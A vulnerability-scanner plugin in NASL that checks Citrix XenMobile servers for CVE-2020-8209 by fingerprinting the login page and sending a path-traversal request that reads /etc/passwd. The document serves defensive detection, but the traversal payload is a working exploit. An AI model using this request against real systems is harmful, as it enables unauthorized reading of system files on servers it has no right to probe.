include("compat.inc");


if (description)
{
  script_id(51799298);
  script_cve_id("CVE-2020-8209");
  script_version("1.3");
  script_name(english:"XenMobile any file read");
  script_summary(english:"XenMobile Vcenter any file read");
  script_set_attribute(attribute:"description", value:"XenMobile Vcenter any file read.");
  script_set_attribute(attribute:"solution", value:"XenMobile Vcenter any file read");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www",443,8443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

port = get_kb_item("Services/www");
soc = open_sock_tcp(port);
if (!soc)
{
  audit(AUDIT_SOCK_FAIL, port, appname);
}
if (get_kb_list("SSL/Transport/"+port)){
	res = http_get(item:"/zdm/login_xdm_uc.jsp", port:port);
	ssl_res = https_req_get(request:res, port:port);
	if("XenMobile" >< ssl_res && "Citrix" >< ssl_res){
		req = http_get(item:"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd", port:port);
		ssl_reqs = https_req_get(request:req, port:port);
		if("200 OK" >< ssl_reqs && "root:x:0:0" >< ssl_reqs && "/bin/console.sh" >< ssl_reqs){
			security_hole(port:port, data:ssl_reqs);
		}	
	}
	
}else{
	res = http_send_recv3(method: "GET", port: port, item: "/zdm/login_xdm_uc.jsp", add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
	if("200 OK" >< res[0] && "XenMobile" >< res[2] && "Citrix" >< res[2]){
		req = http_send_recv3(method: "GET", port: port, item: "/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd", add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
		if("200 OK" >< req[0] && "root:x:0:0" >< req[2] && "/bin/console.sh" >< req[2] ){
			security_hole(port:port, extra:req[2]);
		}
	}
}
close(soc);
